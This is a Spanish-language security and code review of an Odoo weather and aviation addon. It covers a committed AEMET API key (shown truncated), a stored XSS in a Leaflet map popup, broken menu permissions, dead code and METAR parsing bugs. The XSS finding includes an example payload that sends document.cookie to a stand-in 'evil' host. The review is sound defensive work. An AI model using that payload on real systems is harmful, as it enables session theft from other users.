# Revisión técnica — `leulit_meteo`

Revisión estática (sin entorno Odoo disponible) de modelos, vistas, seguridad,
crons y assets del addon `addons/leulit_meteo/`. Todas las afirmaciones están
verificadas leyendo el código (imports, `_inherit`, ACL, manifest, `git log`);
donde algo depende de comportamiento del ORM en runtime real se indica
explícitamente en la sección de dudas.

## 1. Resumen ejecutivo

**16 hallazgos**: 1 crítico · 4 altos · 7 medios · 4 bajos.

El hallazgo crítico es una **API Key real de AEMET OpenData commiteada en
claro** en `aemet-api-key.md` (commit `6c01861d`, 2026-04-27), violando
directamente la regla del proyecto de mantener las claves solo en
`ir.config_parameter`/config de Odoo. Los altos incluyen un **XSS
persistente** en el widget de mapa (Leaflet `bindPopup` con texto de usuario
sin escapar), un **menú raíz restringido a `RolIT_developer`** que deja el
módulo inaccesible para los roles a los que el propio `ir.model.access.csv`
concede permisos, un wizard AESA (`leulit_meteo_aesa_doc.py`) completo que es
código muerto y roto (report QWeb inexistente), y un fallo de decodificación
de visibilidad que puede mostrar "0 m" para aeródromos con visibilidad
excelente. El resto son problemas de rendimiento en el cron/HTTP síncrono,
documentación desincronizada del comportamiento real, y bastante código
muerto (servicio AEMET de estaciones climatológicas, sincronización CheckWX,
umbrales operacionales sin consumidor).

## 2. Tabla de hallazgos

| Severidad | Fichero:línea | Problema | Escenario que lo dispara | Fix propuesto |
|---|---|---|---|---|
| Crítico | `aemet-api-key.md:2` | JWT real de AEMET OpenData commiteado en claro en el repo | `git log`/`git show` sobre el fichero, o simplemente clonar el repo, expone la clave a cualquiera con acceso al histórico | Rotar la clave en AEMET, eliminar el fichero (no solo el contenido — queda en el historial de git), y si se quiere purgar del historial usar `git filter-repo`/BFG. Añadir `*.md` con patrón de key a `.gitignore` no basta: el problema es que la clave nunca debió commitearse |
| Alto | `views/menu.xml:5-9` + `security/ir.model.access.csv:2-3,7-8` | El menú raíz `menu_leulit_meteo_root` exige `leulit.RolIT_developer`, pero el ACL da CRUD a `leulit.RBase`/`leulit.RBase_employee` sobre `leulit.meteo.consulta` y `leulit.meteo.metar` | Cualquier usuario normal (piloto, operaciones) con esos roles no ve el menú "Meteorología" en absoluto — el módulo es invisible pese a tener permisos de modelo | Cambiar `groups="leulit.RolIT_developer"` por `leulit.RBase` (o quitar el atributo `groups` y dejar que cada submenú herede del ACL de su acción) |
| Alto | `static/src/js/meteo_map_widget.js:123` y `:166-170` | `marker.bindPopup(label)` inserta `point.nombre` como HTML sin escapar (comportamiento estándar de Leaflet: contenido string → `innerHTML`) | Un usuario con `create`/`write` en `leulit.meteo.consulta.punto` (RBase y RBase_employee lo tienen) pone `<img src=x onerror=fetch(...)>` en el campo "Nombre del Punto"; cualquier otro usuario que abra esa consulta y vea el mapa ejecuta ese HTML/JS en su sesión backend | Escapar el texto antes de pasarlo a `bindPopup`, o usar `L.DomUtil.create('span')` + `textContent` en vez de pasar un string, p.ej. `marker.bindPopup(L.Util.template('<span></span>')).getPopup().setContent(document.createTextNode(label))` — o más simple: una función `_escapeHtml(label)` antes de `bindPopup` |
| Alto | `models/leulit_meteo_aesa_doc.py` (todo el fichero) + `models/__init__.py` | `leulit.meteo.aesa.doc` nunca se importa en `models/__init__.py` → la clase no se registra en el ORM; además `action_print_pdf` (línea 48) referencia `leulit_meteo.report_aesa_compliance`, un `ir.actions.report` que no existe en ningún XML del módulo | Si alguien añade el import que falta para "arreglarlo", `action_print_pdf` fallará con `ValueError` de `env.ref()` en tiempo de ejecución; hoy el fichero completo (48 líneas) es inalcanzable, el menú usa un `ir.actions.act_url` distinto (`action_leulit_meteo_aesa_doc_url`) que abre el HTML estático directamente | Decidir: si el wizard PDF ya no hace falta (el `act_url` cubre el caso de uso), eliminar `leulit_meteo_aesa_doc.py` y su vista; si se quiere conservar, añadir el import en `__init__.py`, crear el `ir.actions.report` que falta y su fila en `ir.model.access.csv` |
| Alto | `models/leulit_meteo_metar_parser.py:35,106-118` + `models/leulit_meteo_metar.py:287` | `_parse_visibility` solo reconoce el formato ICAO de 4 dígitos; un METAR en formato US (`10SM`, habitual en el fallback a AviationWeather.gov/CheckWX para aeródromos fuera de España) no matchea nunca. `_write_observacion` hace `'visibility_m': data.get('visibility_m') or 0`, y aunque se quitase el `or 0`, `visibility_m` es `fields.Integer` — Odoo normaliza `None`→`0` igualmente | Un aeródromo con visibilidad excelente (10 millas ≈ 16 km) obtenido vía el fallback AviationWeather/CheckWX se muestra en la ficha decodificada con "0 m" — indistinguible de niebla cero salvo que el usuario revise el RAW | Añadir soporte de formato `##SM`/`P6SM` al parser, y/o exponer un campo booleano `visibilidad_no_parseada` (o dejar el campo vacío mostrando "—" vía un `Char` computado) para no confundir "no se pudo decodificar" con "0 metros reportados" |
| Medio | `data/cron_meteo.xml:10-11` vs `models/leulit_meteo_params.py:20` y `views/leulit_meteo_params_views.xml:21` | El cron corre cada **10 minutos** (`interval_number=10`, `interval_type=minutes`) pero tanto el `help` del campo `cron_activo` como el texto de la vista dicen "cada 2 horas" | Un administrador que lee el wizard de Parámetros se forma una idea equivocada de la frecuencia real de llamadas a AEMET/AviationWeather/CheckWX (6x más llamadas/hora de lo que el texto sugiere), lo que dificulta diagnosticar un rate-limit | Corregir el texto a "cada 10 minutos" (o el intervalo que se decida) en ambos sitios, y mantenerlos sincronizados con `cron_meteo.xml` |
| Medio | `models/leulit_meteo_aemet_service.py:42-45` | `_log_estado` es un método vacío (`pass`); el fichero no importa `logging` en absoluto | Cualquier 401 (key inválida), 404 o 429 (rate limit) de AEMET se descarta en silencio, sin ninguna traza en los logs del servidor | Añadir `_logger = logging.getLogger(__name__)` e implementar `_log_estado` con `_logger.warning(...)`, siguiendo el patrón ya usado en `leulit_meteo_aviation_weather_service.py` |
| Medio | `models/leulit_meteo_icao_reference.py:216-222` (`_cron_notificar_errores`) | Sin deduplicación/backoff: cada ejecución del cron que encuentra errores dispara un email nuevo | Si la key de AEMET falta o AEMET está caída un día entero, se envían hasta 144 emails (uno cada 10 min) al buzón configurado en `email_errores` | Guardar en `ir.config_parameter` la huella del último error notificado (o un timestamp) y solo re-notificar tras cierto intervalo (p.ej. 1x/hora) o cuando el conjunto de aeródromos en error cambie |
| Medio | `models/leulit_meteo_consulta.py:415-424` → `models/leulit_meteo_windy_service.py:156-184` (`get_polyline_forecast`) | Bucle secuencial de llamadas HTTP síncronas (timeout 30 s cada una) por cada punto de la ruta, dentro del propio request HTTP del usuario | Una ruta con 15-20 waypoints puede bloquear el worker varios minutos y arriesgar timeout de proxy/nginx antes de que Odoo responda | Paralelizar con hilos/`concurrent.futures`, o limitar el número máximo de puntos, o mover la consulta a un job asíncrono (patrón ya usado en `leulit/models/res_partner.py` con hilo + cursor propio) |
| Medio | `models/leulit_meteo_icao_reference.py:140-222` (`action_actualizar_metar_cron`) | El cron procesa TODOS los aeródromos con `proxima_actualizacion` vencida en una sola invocación, secuencialmente, con 2-3 llamadas HTTP (hasta 20-30 s de timeout) por aeródromo | En el primer arranque (todos con `proxima_actualizacion=False`) o tras una caída prolongada de AEMET, con ~50 aeródromos configurados la ejecución puede tardar varios minutos, bloqueando un worker de cron | Procesar en lotes (`limit` en el `search` + seguir en la siguiente pasada), o paralelizar con hilos, y/o repartir el primer arranque en el tiempo en vez de disparar todos a la vez |
| Medio | `models/leulit_meteo_icao_reference.py:189,213` (`leulit.meteo.historico`) | Cada aeródromo genera un registro nuevo aprox. cada 35 min, sin ningún cron/acción de purga | Crecimiento no acotado de la tabla con el tiempo (sin retención, sin `active`/archivado) | Añadir un cron de limpieza (p.ej. borrar histórico > 90 días) o documentar explícitamente que es responsabilidad de mantenimiento de BD |
| Medio | `security/ir.model.access.csv` (falta fila para `model_leulit_meteo_aesa_doc`) | No hay ninguna entrada ACL para `leulit.meteo.aesa.doc` | Si en el futuro se resuelve el hallazgo #4 añadiendo el import sin añadir también el ACL, el wizard fallará con error de permisos para todos salvo el superusuario | Añadir la fila ACL a la vez que se decida el futuro del modelo (ver hallazgo #4) |
| Bajo | `models/leulit_meteo_icao_reference.py:311-391` (`action_sincronizar_desde_checkwx`) | Método completo (~80 líneas) sin ningún botón, menú o cron que lo invoque | — (código muerto) | Eliminarlo, o exponerlo en la UI junto a `action_sincronizar_desde_aviationweather` si se quiere ofrecer como fuente alternativa |
| Bajo | `models/leulit_meteo_aemet_service.py:185-365` | Bloque completo "Inventario de estaciones AEMET" (`get_inventario_estaciones`, `get_observaciones_estacion`, `_dms_to_decimal`, `parse_station_coords`, `find_nearest_station`, `latest_observation`, `parse_observacion`, `build_metar_synthetic`) no se usa desde ningún otro fichero del módulo | — (código muerto, ~180 líneas) | Confirmar con el equipo si es resto de la implementación de "METAR sintético" sustituida en el commit `84ccdba0` y eliminarlo si ya no aplica |
| Bajo | `models/leulit_meteo_umbral_config.py` + `views/leulit_meteo_umbral_config_views.xml` | El wizard "Umbrales Operacionales" guarda 6 parámetros en `ir.config_parameter` vía `get_umbrales()`, pero ningún modelo del addon los lee: no existe `_compute_estado_meteo` en ningún `.py`, aunque `WORKFLOW.md` lo documenta como si estuviera implementado | Un administrador configura umbrales GO/MARGINAL/NOGO pensando que afectan a algo, y no tienen ningún efecto — falsa sensación de control operacional | Implementar el semáforo GO/MARGINAL/NOGO documentado en `WORKFLOW.md` (probablemente como campo computado en `leulit.meteo.metar` que llame a `LeulitMeteoUmbralConfig.get_umbrales`), o retirar el wizard hasta que se implemente |
| Bajo | `models/AvisosCapApi.md`, `models/IndicesIncendiosApi.md`, `models/InformacionSateliteApi.md` | Documentación autogenerada de un SDK/cliente OpenAPI de terceros, ubicada dentro de `models/` sin relación con ningún `.py` del addon | — (ruido en el árbol, confunde qué está realmente implementado) | Mover a `docs/` o eliminar si no aportan valor de referencia |

## 3. Hallazgos críticos/altos desarrollados

### 3.1 [CRÍTICO] API Key de AEMET commiteada en claro

`aemet-api-key.md` (raíz del módulo, líneas 1-2):

```
Alta en el servicio AEMET OpenData. Su API Key es:
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJlYWx2YXJlekBoZWxpcGlzdGFzLmNvbSIsImp0aSI6...
```

Confirmado con `git log --follow`: commit `6c01861d`, 2026-04-27, autor
`ealvarezreb`, fichero trackeado (`git ls-files` lo lista), sin entrada en
`.gitignore`. Es un JWT real y decodificable (contiene `sub`,
`userId`, `iss: AEMET`) — no un placeholder.

Esto contradice exactamente la regla del proyecto: las API keys de este
módulo deben vivir solo en `ir.config_parameter` (como hace correctamente
`leulit_meteo_config.py`), nunca en el código fuente ni en ficheros del repo.

**Fix**: rotar la clave en el Centro de Descargas de AEMET OpenData, borrar
el fichero del working tree, y si se considera necesario purgar el
histórico de git con `git filter-repo` (el simple `git rm` no la elimina del
historial, que sigue siendo accesible a cualquiera con acceso al repo).

### 3.2 [ALTO] Menú raíz inaccesible para los roles con permiso real

`views/menu.xml:5-9`:

```xml
<menuitem id="menu_leulit_meteo_root"
          name="Meteorología"
          sequence="60"
          web_icon="leulit,static/description/meteorologia_.png"
          groups="leulit.RolIT_developer"/>
```

`security/ir.model.access.csv:2-3,7-8`:

```
access_leulit_meteo_consulta_base,...,model_leulit_meteo_consulta,leulit.RBase,1,1,1,0
access_leulit_meteo_consulta_employee,...,model_leulit_meteo_consulta,leulit.RBase_employee,1,1,1,1
access_leulit_meteo_metar_base,...,model_leulit_meteo_metar,leulit.RBase,1,1,1,0
access_leulit_meteo_metar_employee,...,model_leulit_meteo_metar,leulit.RBase_employee,1,1,1,1
```

`leulit.RolIT_developer` (definido en `addons/leulit/groups.xml:180`) es el
rol "Herramientas Developer" de IT, sin relación jerárquica con
`leulit.RBase`/`RBase_employee`. Con la configuración actual, ningún
usuario fuera de IT puede siquiera ver el menú "Meteorología" para llegar a
Consultas Clima o Reportes METAR, aunque el ACL les de acceso de lectura,
escritura y creación sobre ambos modelos. No hay documentación en
`README.md`/`WORKFLOW.md` que justifique esta restricción como
intencionada, y el patrón no se repite en ningún otro submenú "operativo"
del módulo (solo los de configuración usan `base.group_system`, lo cual sí
tiene sentido).

**Fix propuesto**:

```xml
<menuitem id="menu_leulit_meteo_root"
          name="Meteorología"
          sequence="60"
          web_icon="leulit,static/description/meteorologia_.png"
          groups="leulit.RBase"/>
```

(Ver también la pregunta abierta sobre esto en la sección 5 — podría ser una
restricción temporal deliberada mientras el módulo está en pruebas.)

### 3.3 [ALTO] XSS persistente en el widget de mapa (Leaflet popup)

`static/src/js/meteo_map_widget.js:123` (dentro de `loadExistingPoints`):

```js
const marker = this.addMarker(point.latitud, point.longitud, point.nombre);
```

y `addMarker` (líneas 165-170):

```js
addMarker(lat, lng, label = null) {
    const marker = L.marker([lat, lng], { draggable: !this.props.readonly })
        .addTo(this.map);
    if (label) {
        marker.bindPopup(label);
    }
    ...
```

`point.nombre` viene directamente del campo `nombre` de
`leulit.meteo.consulta.punto` (Char libre, editable en la tree/form —
`views/leulit_meteo_consulta_views.xml:135,150`), sin ningún sanitizado.
Leaflet's `bindPopup`, cuando recibe un `string`, lo inserta como
`innerHTML` del contenido del popup (comportamiento documentado de la
librería, no un bug de Leaflet). El ACL (`RBase`/`RBase_employee`) concede
`create`/`write` sobre `leulit.meteo.consulta` (y por tanto sobre sus
puntos `One2many`) a cualquier empleado.

**Escenario de disparo**: un usuario crea o edita un punto de ruta con
`nombre = '<img src=x onerror="fetch(\'https://evil/x?c=\'+document.cookie)">'`,
guarda. Cualquier otro usuario (incluido un administrador) que abra esa
consulta y el mapa se renderiza ejecuta ese script en su sesión de backend
Odoo.

**Fix propuesto** (snippet, no aplicado):

```js
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}
...
if (label) {
    marker.bindPopup(escapeHtml(label));
}
```

Aplicar el mismo escapado en `addPointToPolyline` (línea 201) y
`redrawPolyline` (línea 252) aunque ahí el texto es generado por el propio
código ("Punto N") y no es explotable hoy — por consistencia y para evitar
que un futuro cambio introduzca la misma vulnerabilidad.

### 3.4 [ALTO] Wizard AESA: modelo no registrado + report inexistente

`models/leulit_meteo_aesa_doc.py` define `LeulitMeteoAesaDoc` como
`TransientModel`, pero `models/__init__.py` no lo importa:

```python
# models/__init__.py — no aparece 'leulit_meteo_aesa_doc' en ningún import
```

Al no importarse, la clase nunca se registra en el registro de modelos de
Odoo — `self.env['leulit.meteo.aesa.doc']` lanzaría `KeyError`. El propio
`views/leulit_meteo_aesa_doc_views.xml` no define ninguna vista ni acción
para ese modelo (solo un `ir.actions.act_url` que abre directamente
`static/src/aesa_compliance.html`), así que el wizard es hoy totalmente
inalcanzable desde la UI — coherente con que nadie haya notado el import
que falta.

Además, `action_print_pdf` (línea 45-48):

```python
def action_print_pdf(self):
    self.ensure_one()
    return self.env.ref('leulit_meteo.report_aesa_compliance').report_action(self)
```

referencia el external id `leulit_meteo.report_aesa_compliance`. Un `grep`
exhaustivo confirma que no existe ningún `<record model="ir.actions.report">`
en todo el addon — si el modelo se registrase, este método fallaría siempre
con `ValueError: External ID not found`.

**Decisión pendiente del usuario** (ver sección 5): eliminar el wizard
completo (el `act_url` ya cubre "ver/descargar el documento AESA"), o
completarlo (import + report QWeb + fila ACL).

### 3.5 [ALTO] Visibilidad decodificada puede mostrar "0 m" con visibilidad excelente

`models/leulit_meteo_metar_parser.py:35` — la regex solo reconoce el
formato ICAO:

```python
_RE_VIS_4 = re.compile(r"\b(\d{4})\b")
```

Un METAR en formato estadounidense (`...10SM...` o `P6SM`), que puede
llegar vía el fallback a AviationWeather.gov o CheckWX
(`models/leulit_meteo_metar_aemet.py:92-101`, cuando AEMET no tiene el
aeródromo), no matchea nunca esa regex → `visibility_m` queda `None`.

`models/leulit_meteo_metar.py:287` (`_write_observacion`):

```python
'visibility_m': data.get('visibility_m') or 0,
```

`visibility_m` es `fields.Integer` (línea 100 del mismo fichero); Odoo
normaliza internamente `None → 0` para campos numéricos, así que aunque se
quitara el `or 0` el resultado en BD/lectura sería el mismo: **0**.

**Escenario**: un aeródromo fuera de España sin cobertura AEMET, resuelto
vía AviationWeather con un METAR en millas terrestres y visibilidad
excelente, aparece en la pestaña "Datos decodificados" con
`Visibilidad (m) = 0` — indistinguible de "niebla total" para quien no
abra el RAW METAR (que sí es correcto, ya que nunca se altera).

**Fix propuesto**: extender el parser para reconocer `\d{1,2}SM` /
`P6SM` y convertir a metros, y/o no usar `0` como valor "desconocido" —
exponer un indicador aparte (`visibilidad_valida` booleano, o un campo
`Char` calculado tipo "—" cuando no hay dato) para que la UI no confunda
ambos casos.

## 4. Plan de acción priorizado

1. **[Crítico]** Rotar la API Key de AEMET expuesta y eliminar
   `aemet-api-key.md` del repo (valorar purga de histórico con el usuario).
2. **[Alto]** Corregir el `groups` del menú raíz (`views/menu.xml`) para
   que coincida con el ACL real — o confirmar primero si la restricción a
   `RolIT_developer` es intencional (pregunta en sección 5).
3. **[Alto]** Escapar `nombre` antes de `bindPopup` en
   `static/src/js/meteo_map_widget.js` (XSS).
4. **[Alto]** Decidir el destino del wizard AESA
   (`leulit_meteo_aesa_doc.py`): eliminarlo o completarlo (import + report
   QWeb + ACL).
5. **[Alto]** Mejorar el parser de visibilidad para formato US (`SM`) o, como
   mínimo, dejar de representar "no parseado" como "0 m" en la UI.
6. **[Medio]** Sincronizar el texto "cada 2 horas" con el intervalo real
   del cron (10 min) en `leulit_meteo_params.py` y
   `leulit_meteo_params_views.xml`.
7. **[Medio]** Añadir logging real a `AemetOpenDataService._log_estado`.
8. **[Medio]** Añadir deduplicación/backoff a `_cron_notificar_errores`.
9. **[Medio]** Evaluar paralelizar o acotar las llamadas HTTP secuenciales
   en `_consultar_windy_polilinea` y en `action_actualizar_metar_cron`.
10. **[Medio]** Diseñar una política de retención para `leulit.meteo.historico`.
11. **[Medio]** Añadir fila ACL para `leulit.meteo.aesa.doc` si se decide
    conservar el modelo (punto 4).
12. **[Bajo]** Limpiar código muerto: `action_sincronizar_desde_checkwx`,
    el bloque de estaciones climatológicas AEMET
    (`leulit_meteo_aemet_service.py:185-365`), y decidir sobre
    `leulit_meteo_umbral_config` (implementar el semáforo GO/MARGINAL/NOGO
    documentado en `WORKFLOW.md` o retirar el wizard).
13. **[Bajo]** Mover o eliminar la documentación de SDK de terceros dentro
    de `models/`.

## 5. Dudas / no verificable sin entorno

- **Restricción del menú a `RolIT_developer`** (hallazgo 3.2): no hay
  ningún comentario, commit message ni documentación que explique si es
  una restricción deliberada (p. ej. módulo aún en fase de pruebas
  internas antes de abrirlo a toda la plantilla) o un descuido. Antes de
  aplicar el fix propuesto, confirmar con el usuario la intención.
- **Comportamiento exacto de `fields.Integer` con `None`**: la afirmación
  de que Odoo normaliza `None → 0` en campos `Integer`/`Float` al
  escribir/leer es un comportamiento histórico y bien documentado del ORM,
  pero no se ha podido ejecutar código para confirmarlo en esta instancia
  concreta (no hay Odoo local). Si se decide corregir el hallazgo 3.5,
  conviene verificarlo primero en el entorno de pruebas Docker antes de
  diseñar el fix definitivo.
- **Volumen real de aeródromos de referencia**: los hallazgos de
  rendimiento del cron (3.9, 3.10 de la tabla) asumen un orden de
  magnitud de "decenas" de aeródromos en `leulit.meteo.icao.reference`
  (España tiene ~50 aeródromos con METAR/TAF oficial). No se ha podido
  consultar el número real de registros en producción; si la tabla tiene
  muchos menos registros el riesgo de timeout del cron es menor de lo
  indicado.
- **Rate limits reales de AEMET/CheckWX**: no se ha podido verificar contra
  las APIs reales cuántas llamadas por minuto/día tolera cada proveedor;
  la recomendación de las llamadas cada 10 min (hallazgo 3.6) es una
  cuestión de claridad de documentación, no necesariamente un problema de
  cuota (CheckWX sí tiene un circuit-breaker explícito para 429 en
  `leulit_meteo_checkwx_service.py`; AEMET no).
